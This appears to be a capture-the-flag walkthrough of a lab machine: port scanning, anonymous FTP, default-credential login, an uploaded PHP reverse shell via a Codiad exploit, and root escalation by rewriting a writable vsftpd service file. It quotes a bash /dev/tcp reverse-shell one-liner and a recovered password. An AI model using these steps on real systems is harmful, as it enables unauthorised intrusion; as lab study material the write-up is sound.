* IP = 10.10.33.250

## Questions/Tasks:

* Firstly, we scan for any open ports:
```bash
nmap -sC -sV $IP
```
### Nmap Initial Scan Results:
```bash

* This brings us here when opened in browser:<br>

* Search for directories on the webpage using Gobuster:
```
gobuster -u "http://10.10.164.73/" -w common.txt
```
### GoBuster Scan Results:
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)

* On the other hand there is *Anonymous* login enabled over FTP server(Which helps to login with username as Anonymous and with no password)...Let's try that<br>
![Screenshot](./assets/2.png)
* Contents of the file `-`:
```
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```
* At this moment I have no idea what that meansüòÆ‚Äçüí®üòÆ‚Äçüí®, anyways let's keep the statement in mind and save for later use!!
* Let's note `john` and `drac` as usernames for possible brute force on the webpage.
* Since gobuster shows us nothing interesting, we try an all port scan on Nmap( Maybe it can find something on some other port)ü§î
### Nmap All Port Scan Results:
* Using `-p-` and `-Pn` switches:
* Since it was taking wayy too long, I decided to stop the whole scan:<br>
![Screenshot](./assets/3.png)
* And searched only for ephemeral ports:<br>
![Screenshot](./assets/4.png)
* Finally we got **62337** as an open port.
* visit the webpage: http://IP:62337/ which looks like this:<br>
![Screenshot](./assets/5.png)
* Used a python [script](./script.py) to login, and got success in first try with Username as **john** and password as **password**
* After logging in:
![Screenshot](./assets/6.png)
* Searched for known exploits in <a href="https://www.exploit-db.com/">exploit-db</a> for **Codiad** and found some.
* Used a custom [script](./script.py) to upload a php reverse shell payload file
* Setup a netcat listener and run the script:<br>
![Screenshot](./assets/7.png)
* Navigate to */home/drac* we see the following contents:<br>
![Screenshot](./assets/8.png)
* Use the found password `Th3dRaCULa1sR3aL` it escalate privileges to **drac**

* Firstly check for `sudo -l` using the same password:<br>
![Screenshot](./assets/10.png)
* So, we can restart the vsFTPd service.
* Check the current status with `systemctl status vsftpd`:<br>
![Screenshot](./assets/11.png)
* See carefully that the service loads **/lib/systemd/system/vsftpd.service** as the service file
* Also notice that the file permissions are: `-rw-rw-r--` which means its readable and writable for the *drac* group ID
* User nano/vim/vi to edit the file:
* Modify the `ExecStart` value with `/bin/bash -c 'bash -i >& /dev/tcp/[YOUR IP]/[PORT] 0>&1'`
* Finally it must look like this:<br>
![Screenshot](./assets/12.png)
* Now setup another listener in your machine with specified port
* Restart the vsftpd service like this:<br>

* A root connection will be received:<br>
